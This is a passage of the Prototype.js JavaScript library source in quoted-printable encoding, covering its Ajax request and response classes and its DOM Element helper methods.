  return {
    toColorPart:    toColorPart,
    succ:           succ,
    times:          times,
    toPaddedString: toPaddedString,
    toJSON:         toJSON,
    abs:            abs,
    round:          round,
    ceil:           ceil,
    floor:          floor
  };
})());

function $R(start, end, exclusive) {
  return new ObjectRange(start, end, exclusive);
}

var ObjectRange =3D Class.create(Enumerable, (function() {
  function initialize(start, end, exclusive) {
    this.start =3D start;
    this.end =3D end;
    this.exclusive =3D exclusive;
  }

  function _each(iterator) {
    var value =3D this.start;
    while (this.include(value)) {
      iterator(value);
      value =3D value.succ();
    }
  }

  function include(value) {
    if (value < this.start)
      return false;
    if (this.exclusive)
      return value < this.end;
    return value <=3D this.end;
  }

  return {
    initialize: initialize,
    _each:      _each,
    include:    include
  };
})());



var Ajax =3D {
  getTransport: function() {
    return Try.these(
      function() {return new XMLHttpRequest()},
      function() {return new ActiveXObject('Msxml2.XMLHTTP')},
      function() {return new ActiveXObject('Microsoft.XMLHTTP')}
    ) || false;
  },

  activeRequestCount: 0
};

Ajax.Responders =3D {
  responders: [],

  _each: function(iterator) {
    this.responders._each(iterator);
  },

  register: function(responder) {
    if (!this.include(responder))
      this.responders.push(responder);
  },

  unregister: function(responder) {
    this.responders =3D this.responders.without(responder);
  },

  dispatch: function(callback, request, transport, json) {
    this.each(function(responder) {
      if (Object.isFunction(responder[callback])) {
        try {
          responder[callback].apply(responder, [request, transport, json]);
        } catch (e) { }
      }
    });
  }
};

Object.extend(Ajax.Responders, Enumerable);

Ajax.Responders.register({
  onCreate:   function() { Ajax.activeRequestCount++ },
  onComplete: function() { Ajax.activeRequestCount-- }
});
Ajax.Base =3D Class.create({
  initialize: function(options) {
    this.options =3D {
      method:       'post',
      asynchronous: true,
      contentType:  'application/x-www-form-urlencoded',
      encoding:     'UTF-8',
      parameters:   '',
      evalJSON:     true,
      evalJS:       true
    };
    Object.extend(this.options, options || { });

    this.options.method =3D this.options.method.toLowerCase();

    if (Object.isString(this.options.parameters))
      this.options.parameters =3D this.options.parameters.toQueryParams();
    else if (Object.isHash(this.options.parameters))
      this.options.parameters =3D this.options.parameters.toObject();
  }
});
Ajax.Request =3D Class.create(Ajax.Base, {
  _complete: false,

  initialize: function($super, url, options) {
    $super(options);
    this.transport =3D Ajax.getTransport();
    this.request(url);
  },

  request: function(url) {
    this.url =3D url;
    this.method =3D this.options.method;
    var params =3D Object.clone(this.options.parameters);

    if (!['get', 'post'].include(this.method)) {
      params['_method'] =3D this.method;
      this.method =3D 'post';
    }

    this.parameters =3D params;

    if (params =3D Object.toQueryString(params)) {
      if (this.method =3D=3D 'get')
        this.url +=3D (this.url.include('?') ? '&' : '?') + params;
      else if (/Konqueror|Safari|KHTML/.test(navigator.userAgent))
        params +=3D '&_=3D';
    }

    try {
      var response =3D new Ajax.Response(this);
      if (this.options.onCreate) this.options.onCreate(response);
      Ajax.Responders.dispatch('onCreate', this, response);

      this.transport.open(this.method.toUpperCase(), this.url,
        this.options.asynchronous);

      if (this.options.asynchronous) this.respondToReadyState.bind(this).de=
fer(1);

      this.transport.onreadystatechange =3D this.onStateChange.bind(this);
      this.setRequestHeaders();

      this.body =3D this.method =3D=3D 'post' ? (this.options.postBody ||=
 params) : null;
      this.transport.send(this.body);

      /* Force Firefox to handle ready state 4 for synchronous requests */
      if (!this.options.asynchronous && this.transport.overrideMimeType)
        this.onStateChange();

    }
    catch (e) {
      this.dispatchException(e);
    }
  },

  onStateChange: function() {
    var readyState =3D this.transport.readyState;
    if (readyState > 1 && !((readyState =3D=3D 4) && this._complete))
      this.respondToReadyState(this.transport.readyState);
  },

  setRequestHeaders: function() {
    var headers =3D {
      'X-Requested-With': 'XMLHttpRequest',
      'X-Prototype-Version': Prototype.Version,
      'Accept': 'text/javascript, text/html, application/xml, text/xml, */*'
    };

    if (this.method =3D=3D 'post') {
      headers['Content-type'] =3D this.options.contentType +
        (this.options.encoding ? '; charset=3D' + this.options.encoding :=
 '');

      /* Force "Connection: close" for older Mozilla browsers to work
       * around a bug where XMLHttpRequest sends an incorrect
       * Content-length header. See Mozilla Bugzilla #246651.
       */
      if (this.transport.overrideMimeType &&
          (navigator.userAgent.match(/Gecko\/(\d{4})/) || [0,2005])[1] < 20=
05)
            headers['Connection'] =3D 'close';
    }

    if (typeof this.options.requestHeaders =3D=3D 'object') {
      var extras =3D this.options.requestHeaders;

      if (Object.isFunction(extras.push))
        for (var i =3D 0, length =3D extras.length; i < length; i +=3D 2)
          headers[extras[i]] =3D extras[i+1];
      else
        $H(extras).each(function(pair) { headers[pair.key] =3D pair.value=
 });
    }

    for (var name in headers)
      this.transport.setRequestHeader(name, headers[name]);
  },

  success: function() {
    var status =3D this.getStatus();
    return !status || (status >=3D 200 && status < 300);
  },

  getStatus: function() {
    try {
      return this.transport.status || 0;
    } catch (e) { return 0 }
  },

  respondToReadyState: function(readyState) {
    var state =3D Ajax.Request.Events[readyState], response =3D new Ajax.Re=
sponse(this);

    if (state =3D=3D 'Complete') {
      try {
        this._complete =3D true;
        (this.options['on' + response.status]
         || this.options['on' + (this.success() ? 'Success' : 'Failure')]
         || Prototype.emptyFunction)(response, response.headerJSON);
      } catch (e) {
        this.dispatchException(e);
      }

      var contentType =3D response.getHeader('Content-type');
      if (this.options.evalJS =3D=3D 'force'
          || (this.options.evalJS && this.isSameOrigin() && contentType
          && contentType.match(/^\s*(text|application)\/(x-)?(java|ecma)scr=
ipt(;.*)?\s*$/i)))
        this.evalResponse();
    }

    try {
      (this.options['on' + state] || Prototype.emptyFunction)(response, res=
ponse.headerJSON);
      Ajax.Responders.dispatch('on' + state, this, response, response.heade=
rJSON);
    } catch (e) {
      this.dispatchException(e);
    }

    if (state =3D=3D 'Complete') {
      this.transport.onreadystatechange =3D Prototype.emptyFunction;
    }
  },

  isSameOrigin: function() {
    var m =3D this.url.match(/^\s*https?:\/\/[^\/]*/);
    return !m || (m[0] =3D=3D '#{protocol}//#{domain}#{port}'.interpolate({
      protocol: location.protocol,
      domain: document.domain,
      port: location.port ? ':' + location.port : ''
    }));
  },

  getHeader: function(name) {
    try {
      return this.transport.getResponseHeader(name) || null;
    } catch (e) { return null; }
  },

  evalResponse: function() {
    try {
      return eval((this.transport.responseText || '').unfilterJSON());
    } catch (e) {
      this.dispatchException(e);
    }
  },

  dispatchException: function(exception) {
    (this.options.onException || Prototype.emptyFunction)(this, exception);
    Ajax.Responders.dispatch('onException', this, exception);
  }
});

Ajax.Request.Events =3D
  ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete'];








Ajax.Response =3D Class.create({
  initialize: function(request){
    this.request =3D request;
    var transport  =3D this.transport  =3D request.transport,
        readyState =3D this.readyState =3D transport.readyState;

    if((readyState > 2 && !Prototype.Browser.IE) || readyState =3D=3D 4) {
      this.status       =3D this.getStatus();
      this.statusText   =3D this.getStatusText();
      this.responseText =3D String.interpret(transport.responseText);
      this.headerJSON   =3D this._getHeaderJSON();
    }

    if(readyState =3D=3D 4) {
      var xml =3D transport.responseXML;
      this.responseXML  =3D Object.isUndefined(xml) ? null : xml;
      this.responseJSON =3D this._getResponseJSON();
    }
  },

  status:      0,

  statusText: '',

  getStatus: Ajax.Request.prototype.getStatus,

  getStatusText: function() {
    try {
      return this.transport.statusText || '';
    } catch (e) { return '' }
  },

  getHeader: Ajax.Request.prototype.getHeader,

  getAllHeaders: function() {
    try {
      return this.getAllResponseHeaders();
    } catch (e) { return null }
  },

  getResponseHeader: function(name) {
    return this.transport.getResponseHeader(name);
  },

  getAllResponseHeaders: function() {
    return this.transport.getAllResponseHeaders();
  },

  _getHeaderJSON: function() {
    var json =3D this.getHeader('X-JSON');
    if (!json) return null;
    json =3D decodeURIComponent(escape(json));
    try {
      return json.evalJSON(this.request.options.sanitizeJSON ||
        !this.request.isSameOrigin());
    } catch (e) {
      this.request.dispatchException(e);
    }
  },

  _getResponseJSON: function() {
    var options =3D this.request.options;
    if (!options.evalJSON || (options.evalJSON !=3D 'force' &&
      !(this.getHeader('Content-type') || '').include('application/json'))=
 ||
        this.responseText.blank())
          return null;
    try {
      return this.responseText.evalJSON(options.sanitizeJSON ||
        !this.request.isSameOrigin());
    } catch (e) {
      this.request.dispatchException(e);
    }
  }
});

Ajax.Updater =3D Class.create(Ajax.Request, {
  initialize: function($super, container, url, options) {
    this.container =3D {
      success: (container.success || container),
      failure: (container.failure || (container.success ? null : container))
    };

    options =3D Object.clone(options);
    var onComplete =3D options.onComplete;
    options.onComplete =3D (function(response, json) {
      this.updateContent(response.responseText);
      if (Object.isFunction(onComplete)) onComplete(response, json);
    }).bind(this);

    $super(url, options);
  },

  updateContent: function(responseText) {
    var receiver =3D this.container[this.success() ? 'success' : 'failure'],
        options =3D this.options;

    if (!options.evalScripts) responseText =3D responseText.stripScripts();

    if (receiver =3D $(receiver)) {
      if (options.insertion) {
        if (Object.isString(options.insertion)) {
          var insertion =3D { }; insertion[options.insertion] =3D responseT=
ext;
          receiver.insert(insertion);
        }
        else options.insertion(receiver, responseText);
      }
      else receiver.update(responseText);
    }
  }
});

Ajax.PeriodicalUpdater =3D Class.create(Ajax.Base, {
  initialize: function($super, container, url, options) {
    $super(options);
    this.onComplete =3D this.options.onComplete;

    this.frequency =3D (this.options.frequency || 2);
    this.decay =3D (this.options.decay || 1);

    this.updater =3D { };
    this.container =3D container;
    this.url =3D url;

    this.start();
  },

  start: function() {
    this.options.onComplete =3D this.updateComplete.bind(this);
    this.onTimerEvent();
  },

  stop: function() {
    this.updater.options.onComplete =3D undefined;
    clearTimeout(this.timer);
    (this.onComplete || Prototype.emptyFunction).apply(this, arguments);
  },

  updateComplete: function(response) {
    if (this.options.decay) {
      this.decay =3D (response.responseText =3D=3D this.lastText ?
        this.decay * this.options.decay : 1);

      this.lastText =3D response.responseText;
    }
    this.timer =3D this.onTimerEvent.bind(this).delay(this.decay * this.fre=
quency);
  },

  onTimerEvent: function() {
    this.updater =3D new Ajax.Updater(this.container, this.url, this.option=
s);
  }
});



function $(element) {
  if (arguments.length > 1) {
    for (var i =3D 0, elements =3D [], length =3D arguments.length; i < len=
gth; i++)
      elements.push($(arguments[i]));
    return elements;
  }
  if (Object.isString(element))
    element =3D document.getElementById(element);
  return Element.extend(element);
}

if (Prototype.BrowserFeatures.XPath) {
  document._getElementsByXPath =3D function(expression, parentElement) {
    var results =3D [];
    var query =3D document.evaluate(expression, $(parentElement) || documen=
t,
      null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
    for (var i =3D 0, length =3D query.snapshotLength; i < length; i++)
      results.push(Element.extend(query.snapshotItem(i)));
    return results;
  };
}

/*-------------------------------------------------------------------------=
-*/

if (!window.Node) var Node =3D { };

if (!Node.ELEMENT_NODE) {
  Object.extend(Node, {
    ELEMENT_NODE: 1,
    ATTRIBUTE_NODE: 2,
    TEXT_NODE: 3,
    CDATA_SECTION_NODE: 4,
    ENTITY_REFERENCE_NODE: 5,
    ENTITY_NODE: 6,
    PROCESSING_INSTRUCTION_NODE: 7,
    COMMENT_NODE: 8,
    DOCUMENT_NODE: 9,
    DOCUMENT_TYPE_NODE: 10,
    DOCUMENT_FRAGMENT_NODE: 11,
    NOTATION_NODE: 12
  });
}


(function(global) {

  var SETATTRIBUTE_IGNORES_NAME =3D (function(){
    var elForm =3D document.createElement("form");
    var elInput =3D document.createElement("input");
    var root =3D document.documentElement;
    elInput.setAttribute("name", "test");
    elForm.appendChild(elInput);
    root.appendChild(elForm);
    var isBuggy =3D elForm.elements
      ? (typeof elForm.elements.test =3D=3D "undefined")
      : null;
    root.removeChild(elForm);
    elForm =3D elInput =3D null;
    return isBuggy;
  })();

  var element =3D global.Element;
  global.Element =3D function(tagName, attributes) {
    attributes =3D attributes || { };
    tagName =3D tagName.toLowerCase();
    var cache =3D Element.cache;
    if (SETATTRIBUTE_IGNORES_NAME && attributes.name) {
      tagName =3D '<' + tagName + ' name=3D"' + attributes.name + '">';
      delete attributes.name;
      return Element.writeAttribute(document.createElement(tagName), attrib=
utes);
    }
    if (!cache[tagName]) cache[tagName] =3D Element.extend(document.createE=
lement(tagName));
    return Element.writeAttribute(cache[tagName].cloneNode(false), attribut=
es);
  };
  Object.extend(global.Element, element || { });
  if (element) global.Element.prototype =3D element.prototype;
})(this);

Element.cache =3D { };
Element.idCounter =3D 1;

Element.Methods =3D {
  visible: function(element) {
    return $(element).style.display !=3D 'none';
  },

  toggle: function(element) {
    element =3D $(element);
    Element[Element.visible(element) ? 'hide' : 'show'](element);
    return element;
  },


  hide: function(element) {
    element =3D $(element);
    element.style.display =3D 'none';
    return element;
  },

  show: function(element) {
    element =3D $(element);
    element.style.display =3D '';
    return element;
  },

  remove: function(element) {
    element =3D $(element);
    element.parentNode.removeChild(element);
    return element;
  },

  update: (function(){

    var SELECT_ELEMENT_INNERHTML_BUGGY =3D (function(){
      var el =3D document.createElement("select"),
          isBuggy =3D true;
      el.innerHTML =3D "<option value=3D\"test\">test</option>";
      if (el.options && el.options[0]) {
        isBuggy =3D el.options[0].nodeName.toUpperCase() !=3D=3D "OPTION";
      }
      el =3D null;
      return isBuggy;
    })();

    var TABLE_ELEMENT_INNERHTML_BUGGY =3D (function(){
      try {
        var el =3D document.createElement("table");
        if (el && el.tBodies) {
          el.innerHTML =3D "<tbody><tr><td>test</td></tr></tbody>";
          var isBuggy =3D typeof el.tBodies[0] =3D=3D "undefined";
          el =3D null;
          return isBuggy;
        }
      } catch (e) {
        return true;
      }
    })();

    var SCRIPT_ELEMENT_REJECTS_TEXTNODE_APPENDING =3D (function () {
      var s =3D document.createElement("script"),
          isBuggy =3D false;
      try {
        s.appendChild(document.createTextNode(""));
        isBuggy =3D !s.firstChild ||
          s.firstChild && s.firstChild.nodeType !=3D=3D 3;
      } catch (e) {
        isBuggy =3D true;
      }
      s =3D null;
      return isBuggy;
    })();

    function update(element, content) {
      element =3D $(element);

      if (content && content.toElement)
        content =3D content.toElement();

      if (Object.isElement(content))
        return element.update().insert(content);

      content =3D Object.toHTML(content);

      var tagName =3D element.tagName.toUpperCase();

      if (tagName =3D=3D=3D 'SCRIPT' && SCRIPT_ELEMENT_REJECTS_TEXTNODE_APP=
ENDING) {
        element.text =3D content;
        return element;
      }

      if (SELECT_ELEMENT_INNERHTML_BUGGY || TABLE_ELEMENT_INNERHTML_BUGGY) {
        if (tagName in Element._insertionTranslations.tags) {
          while (element.firstChild) {
            element.removeChild(element.firstChild);
          }
          Element._getContentFromAnonymousElement(tagName, content.stripScr=
ipts())
            .each(function(node) {
              element.appendChild(node)
            });
        }
        else {
          element.innerHTML =3D content.stripScripts();
        }
      }
      else {
        element.innerHTML =3D content.stripScripts();
      }

      content.evalScripts.bind(content).defer();
      return element;
    }

    return update;
  })(),

  replace: function(element, content) {
    element =3D $(element);
    if (content && content.toElement) content =3D content.toElement();
    else if (!Object.isElement(content)) {
      content =3D Object.toHTML(content);
      var range =3D element.ownerDocument.createRange();
      range.selectNode(element);
      content.evalScripts.bind(content).defer();
      content =3D range.createContextualFragment(content.stripScripts());
    }
    element.parentNode.replaceChild(content, element);
    return element;
  },

  insert: function(element, insertions) {
    element =3D $(element);

    if (Object.isString(insertions) || Object.isNumber(insertions) ||
        Object.isElement(insertions) || (insertions && (insertions.toElemen=
t || insertions.toHTML)))
          insertions =3D {bottom:insertions};

    var content, insert, tagName, childNodes;

    for (var position in insertions) {
      content  =3D insertions[position];
      position =3D position.toLowerCase();
      insert =3D Element._insertionTranslations[position];

      if (content && content.toElement) content =3D content.toElement();
      if (Object.isElement(content)) {
        insert(element, content);
        continue;
      }

      content =3D Object.toHTML(content);

      tagName =3D ((position =3D=3D 'before' || position =3D=3D 'after')
        ? element.parentNode : element).tagName.toUpperCase();

      childNodes =3D Element._getContentFromAnonymousElement(tagName, conte=
nt.stripScripts());

      if (position =3D=3D 'top' || position =3D=3D 'after') childNodes.reve=
rse();
      childNodes.each(insert.curry(element));

      content.evalScripts.bind(content).defer();
    }

    return element;
  },

  wrap: function(element, wrapper, attributes) {
    element =3D $(element);
    if (Object.isElement(wrapper))
      $(wrapper).writeAttribute(attributes || { });
    else if (Object.isString(wrapper)) wrapper =3D new Element(wrapper, att=
ributes);
    else wrapper =3D new Element('div', wrapper);
    if (element.parentNode)
      element.parentNode.replaceChild(wrapper, element);
    wrapper.appendChild(element);
    return wrapper;
  },

  inspect: function(element) {
    element =3D $(element);
    var result =3D '<' + element.tagName.toLowerCase();
    $H({'id': 'id', 'className': 'class'}).each(function(pair) {
      var property =3D pair.first(), attribute =3D pair.last();
      var value =3D (element[property] || '').toString();
      if (value) result +=3D ' ' + attribute + '=3D' + value.inspect(true);
    });
    return result + '>';
  },

  recursivelyCollect: function(element, property) {
    element =3D $(element);
    var elements =3D [];
    while (element =3D element[property])
      if (element.nodeType =3D=3D 1)
        elements.push(Element.extend(element));
    return elements;
  },

  ancestors: function(element) {
    return Element.recursivelyCollect(element, 'parentNode');
  },

  descendants: function(element) {
    return Element.select(element, "*");
  },

  firstDescendant: function(element) {
    element =3D $(element).firstChild;
    while (element && element.nodeType !=3D 1) element =3D element.nextSibl=
ing;
    return $(element);
  },

  immediateDescendants: function(element) {
    if (!(element =3D $(element).firstChild)) return [];
    while (element && element.nodeType !=3D 1) element =3D element.nextSibl=
ing;
    if (element) return [element].concat($(element).nextSiblings());
    return [];
  },

  previousSiblings: function(element) {
    return Element.recursivelyCollect(element, 'previousSibling');
  },

  nextSiblings: function(element) {
    return Element.recursivelyCollect(element, 'nextSibling');
  },

  siblings: function(element) {
    element =3D $(element);
    return Element.previousSiblings(element).reverse()
      .concat(Element.nextSiblings(element));
  },

  match: function(element, selector) {
    if (Object.isString(selector))
      selector =3D new Selector(selector);
    return selector.match($(element));
  },

  up: function(element, expression, index) {
    element =3D $(element);
    if (arguments.length =3D=3D 1) return $(element.parentNode);
    var ancestors =3D Element.ancestors(element);
    return Object.isNumber(expression) ? ancestors[expression] :
      Selector.findElement(ancestors, expression, index);
  },

  down: function(element, expression, index) {
    element =3D $(element);
    if (arguments.length =3D=3D 1) return Element.firstDescendant(element);
    return Object.isNumber(expression) ? Element.descendants(element)[expre=
ssion] :
      Element.select(element, expression)[index || 0];
  },

  previous: function(element, expression, index) {
    element =3D $(element);
    if (arguments.length =3D=3D 1) return $(Selector.handlers.previousEleme=
ntSibling(element));
    var previousSiblings =3D Element.previousSiblings(element);
    return Object.isNumber(expression) ? previousSiblings[expression] :
      Selector.findElement(previousSiblings, expression, index);
  },

  next: function(element, expression, index) {
    element =3D $(element);
    if (arguments.length =3D=3D 1) return $(Selector.handlers.nextElementSi=
bling(element));
    var nextSiblings =3D Element.nextSiblings(element);
    return Object.isNumber(expression) ? nextSiblings[expression] :
      Selector.findElement(nextSiblings, expression, index);
  },


  select: function(element) {
    var args =3D Array.prototype.slice.call(arguments, 1);
    return Selector.findChildElements(element, args);
  },

  adjacent: function(element) {
    var args =3D Array.prototype.slice.call(arguments, 1);
    return Selector.findChildElements(element.parentNode, args).without(ele=
ment);
  },

  identify: function(element) {
    element =3D $(element);
    var id =3D Element.readAttribute(element, 'id');
    if (id) return id;
    do { id =3D 'anonymous_element_' + Element.idCounter++ } while ($(id));
    Element.writeAttribute(element, 'id', id);
    return id;
  },

  readAttribute: function(element, name) {
    element =3D $(element);
    if (Prototype.Browser.IE) {
      var t =3D Element._attributeTranslations.read;
      if (t.values[name]) return t.values[name](element, name);
      if (t.names[name]) name =3D t.names[name];
      if (name.include(':')) {
        return (!element.attributes || !element.attributes[name]) ? null :
         element.attributes[name].value;
      }
    }
    return element.getAttribute(name);
  },

  writeAttribute: function(element, name, value) {
    element =3D $(element);
    var attributes =3D { }, t =3D Element._attributeTranslations.write;

    if (typeof name =3D=3D 'object') attributes =3D name;
    else attributes[name] =3D Object.isUndefined(value) ? true : value;

    for (var attr in attributes) {
      name =3D t.names[attr] || attr;
      value =3D attributes[attr];
      if (t.values[attr]) name =3D t.values[attr](element, value);
      if (value =3D=3D=3D false || value =3D=3D=3D null)
        element.removeAttribute(name);
      else if (value =3D=3D=3D true)
        element.setAttribute(name, name);
      else element.setAttribute(name, value);
    }
    return element;
  },

  getHeight: function(element) {
    return Element.getDimensions(element).height;
  },

  getWidth: function(element) {
    return Element.getDimensions(element).width;
  },

  classNames: function(element) {
    return new Element.ClassNames(element);
  },

  hasClassName: function(element, className) {
    if (!(element =3D $(element))) return;
    var elementClassName =3D element.className;
    return (elementClassName.length > 0 && (elementClassName =3D=3D classNa=
me ||
      new RegExp("(^|\\s)" + className + "(\\s|$)").test(elementClassName))=
);
  },

  addClassName: function(element, className) {
    if (!(element =3D $(element))) return;
    if (!Element.hasClassName(element, className))
      element.className +=3D (element.className ? ' ' : '') + className;
    return element;
  },

  removeClassName: function(element, className) {
    if (!(element =3D $(element))) return;
    element.className =3D element.className.replace(
      new RegExp("(^|\\s+)" + className + "(\\s+|$)"), ' ').strip();
    return element;
  },

  toggleClassName: function(element, className) {
    if (!(element =3D $(element))) return;
    return Element[Element.hasClassName(element, className) ?
      'removeClassName' : 'addClassName'](element, className);
  },

  cleanWhitespace: function(element) {
    element =3D $(element);
    var node =3D element.firstChild;
    while (node) {
      var nextNode =3D node.nextSibling;
      if (node.nodeType =3D=3D 3 && !/\S/.test(node.nodeValue))
        element.removeChild(node);
      node =3D nextNode;
    }
    return element;
  },

  empty: function(element) {
    return $(element).innerHTML.blank();
  },

  descendantOf: function(element, ancestor) {
    element =3D $(element), ancestor =3D $(ancestor);

    if (element.compareDocumentPosition)
      return (element.compareDocumentPosition(ancestor) & 8) =3D=3D=3D 8;

    if (ancestor.contains)
      return ancestor.contains(element) && ancestor !=3D=3D element;

    while (element =3D element.parentNode)
      if (element =3D=3D ancestor) return true;

    return false;
  },

  scrollTo: function(element) {
    element =3D $(element);
    var pos =3D Element.cumulativeOffset(element);
    window.scrollTo(pos[0], pos[1]);
    return element;
  },

  getStyle: function(element, style) {
    element =3D $(element);
    style =3D style =3D=3D 'float' ? 'cssFloat' : style.camelize();
    var value =3D element.style[style];
    if (!value || value =3D=3D 'auto') {
      var css =3D document.defaultView.getComputedStyle(element, null);
      value =3D css ? css[style] : null;
    }
    if (style =3D=3D 'opacity') return value ? parseFloat(value) : 1.0;
    return value =3D=3D 'auto' ? null : value;
  },

  getOpacity: function(element) {
    return $(element).getStyle('opacity');
  },

  setStyle: function(element, styles) {
    element =3D $(element);
    var elementStyle =3D element.style, match;
    if (Object.isString(styles)) {
      element.style.cssText +=3D ';' + styles;
      return styles.include('opacity') ?
        element.setOpacity(styles.match(/opacity:\s*(\d?\.?\d*)/)[1]) : ele=
ment;
    }
    for (var property in styles)
      if (property =3D=3D 'opacity') element.setOpacity(styles[property]);
      else
        elementStyle[(property =3D=3D 'float' || property =3D=3D 'cssFloat'=
) ?
          (Object.isUndefined(elementStyle.styleFloat) ? 'cssFloat' : 'styl=
eFloat') :
            property] =3D styles[property];

    return element;
  },

  setOpacity: function(element, value) {
    element =3D $(element);
    element.style.opacity =3D (value =3D=3D 1 || value =3D=3D=3D '') ? ''=
 :
      (value < 0.00001) ? 0 : value;
    return element;
  },

  getDimensions: function(element) {
    element =3D $(element);
    var display =3D Element.getStyle(element, 'display');
    if (display !=3D 'none' && display !=3D null) // Safari bug
      return {width: element.offsetWidth, height: element.offsetHeight};

    var els =3D element.style;
    var originalVisibility =3D els.visibility;
    var originalPosition =3D els.position;
    var originalDisplay =3D els.display;
    els.visibility =3D 'hidden';
    if (originalPosition !=3D 'fixed') // Switching fixed to absolute cause=
s issues in Safari
      els.position =3D 'absolute';
    els.display =3D 'block';
    var originalWidth =3D element.clientWidth;
    var originalHeight =3D element.clientHeight;
    els.display =3D originalDisplay;
    els.position =3D originalPosition;
    els.visibility =3D originalVisibility;
    return {width: originalWidth, height: originalHeight};
  },

  makePositioned: function(element) {
    element =3D $(element);
    var pos =3D Element.getStyle(element, 'position');
    if (pos =3D=3D 'static' || !pos) {
      element._madePositioned =3D true;
      element.style.position =3D 'relative';
      if (Prototype.Browser.Opera) {
        element.style.top =3D 0;
        element.style.left =3D 0;
      }
    }
    return element;
  },

  undoPositioned: function(element) {
    element =3D $(element);
    if (element._madePositioned) {
      element._madePositioned =3D undefined;
      element.style.position =3D
        element.style.top =3D
        element.style.left =3D
        element.style.bottom =3D
        element.style.right =3D '';
    }
    return element;
  },

  makeClipping: function(element) {
    element =3D $(element);
    if (element._overflow) return element;
    element._overflow =3D Element.getStyle(element, 'overflow') || 'auto';
    if (element._overflow !=3D=3D 'hidden')
      element.style.overflow =3D 'hidden';
    return element;
  },

  undoClipping: function(element) {
    element =3D $(element);
    if (!element._overflow) return element;
    element.style.overflow =3D element._overflow =3D=3D 'auto' ? '' : eleme=
nt._overflow;
    element._overflow =3D null;
    return element;
  },

  cumulativeOffset: function(element) {
    var valueT =3D 0, valueL =3D 0;
    do {
      valueT +=3D element.offsetTop  || 0;
      valueL +=3D element.offsetLeft || 0;
      element =3D element.offsetParent;
    } while (element);
    return Element._returnOffset(valueL, valueT);
  },

  positionedOffset: function(element) {
    var valueT =3D 0, valueL =3D 0;
    do {
      valueT +=3D element.offsetTop  || 0;
      valueL +=3D element.offsetLeft || 0;
      element =3D element.offsetParent;
      if (element) {
        if (element.tagName.toUpperCase() =3D=3D 'BODY') break;
        var p =3D Element.getStyle(element, 'position');
        if (p !=3D=3D 'static') break;
      }
    } while (element);
    return Element._returnOffset(valueL, valueT);
  },

  absolutize: function(element) {
    element =3D $(element);
    if (Element.getStyle(element, 'position') =3D=3D 'absolute') return ele=
ment;

    var offsets =3D Element.positionedOffset(element);
    var top     =3D offsets[1];
    var left    =3D offsets[0];
    var width   =3D element.clientWidth;
    var height  =3D element.clientHeight;

    element._originalLeft   =3D left - parseFloat(element.style.left  || 0);
    element._originalTop    =3D top  - parseFloat(element.style.top || 0);
    element._originalWidth  =3D element.style.width;
    element._originalHeight =3D element.style.height;

    element.style.position =3D 'absolute';
    element.style.top    =3D top + 'px';
    element.style.left   =3D left + 'px';
    element.style.width  =3D width + 'px';
    element.style.height =3D height + 'px';
    return element;
  },

  relativize: function(element) {
    element =3D $(element);
    if (Element.getStyle(element, 'position') =3D=3D 'relative') return ele=
ment;

    element.style.position =3D 'relative';
    var top  =3D parseFloat(element.style.top  || 0) - (element._originalTo=
p || 0);
    var left =3D parseFloat(element.style.left || 0) - (element._originalLe=
ft || 0);

    element.style.top    =3D top + 'px';
    element.style.left   =3D left + 'px';
    element.style.height =3D element._originalHeight;
    element.style.width  =3D element._originalWidth;
    return element;
  },

  cumulativeScrollOffset: function(element) {
    var valueT =3D 0, valueL =3D 0;
    do {
      valueT +=3D element.scrollTop  || 0;
      valueL +=3D element.scrollLeft || 0;
      element =3D element.parentNode;
    } while (element);
    return Element._returnOffset(valueL, valueT);
  },

  getOffsetParent: function(element) {
    if (element.offsetParent) return $(element.offsetParent);
    if (element =3D=3D document.body) return $(element);

    while ((element =3D element.parentNode) && element !=3D document.body)
      if (Element.getStyle(element, 'position') !=3D 'static')
        return $(element);

    return $(document.body);
  },

  viewportOffset: function(forElement) {
    var valueT =3D 0, valueL =3D 0;

    var element =3D forElement;
    do {
      valueT +=3D element.offsetTop  || 0;
      valueL +=3D element.offsetLeft || 0;

      if (element.offsetParent =3D=3D document.body &&
        Element.getStyle(element, 'position') =3D=3D 'absolute') break;

    } while (element =3D element.offsetParent);

    element =3D forElement;
    do {
      if (!Prototype.Browser.Opera || (element.tagName && (element.tagName.=
toUpperCase() =3D=3D 'BODY'))) {
        valueT -=3D element.scrollTop  || 0;
        valueL -=3D element.scrollLeft || 0;
      }
    } while (element =3D element.parentNode);

    return Element._returnOffset(valueL, valueT);
  },

  clonePosition: function(element, source) {
    var options =3D Object.extend({
      setLeft:    true,
      setTop:     true,
      setWidth:   true,
      setHeight:  true,
      offsetTop:  0,
      offsetLeft: 0
    }, arguments[2] || { });

    source =3D $(source);
    var p =3D Element.viewportOffset(source);

    element =3D $(element);
    var delta =3D [0, 0];
    var parent =3D null;
    if (Element.getStyle(element, 'position') =3D=3D 'absolute') {
      parent =3D Element.getOffsetParent(element);
      delta =3D Element.viewportOffset(parent);
    }

    if (parent =3D=3D document.body) {
      delta[0] -=3D document.body.offsetLeft;
      delta[1] -=3D document.body.offsetTop;
    }

    if (options.setLeft)   element.style.left  =3D (p[0] - delta[0] + optio=
ns.offsetLeft) + 'px';
    if (options.setTop)    element.style.top   =3D (p[1] - delta[1] + optio=
ns.offsetTop) + 'px';
    if (options.setWidth)  element.style.width =3D source.offsetWidth + 'px=
';
    if (options.setHeight) element.style.height =3D source.offsetHeight +=
 'px';
    return element;
  }
};

Object.extend(Element.Methods, {
  getElementsBySelector: Element.Methods.select,

  childElements: Element.Methods.immediateDescendants
});

Element._attributeTranslations =3D {
  write: {
    names: {
      className: 'class',
      htmlFor:   'for'
    },
    values: { }
  }
};

if (Prototype.Browser.Opera) {
  Element.Methods.getStyle =3D Element.Methods.getStyle.wrap(
    function(proceed, element, style) {
      switch (style) {
        case 'left': case 'top': case 'right': case 'bottom':
          if (proceed(element, 'position') =3D=3D=3D 'static') return null;
        case 'height': case 'width':
          if (!Element.visible(element)) return null;

          var dim =3D parseInt(proceed(element, style), 10);

          if (dim !=3D=3D element['offset' + style.capitalize()])
            return dim + 'px';

          var properties;
          if (style =3D=3D=3D 'height') {
            properties =3D ['border-top-width', 'padding-top',
             'padding-bottom', 'border-bottom-width'];
          }
          else {
            properties =3D ['border-left-width', 'padding-left',
             'padding-right', 'border-right-width'];
          }
          return properties.inject(dim, function(memo, property) {
            var val =3D proceed(element, property);
            return val =3D=3D=3D null ? memo : memo - parseInt(val, 10);
          }) + 'px';
        default: return proceed(element, style);
      }
    }
  );

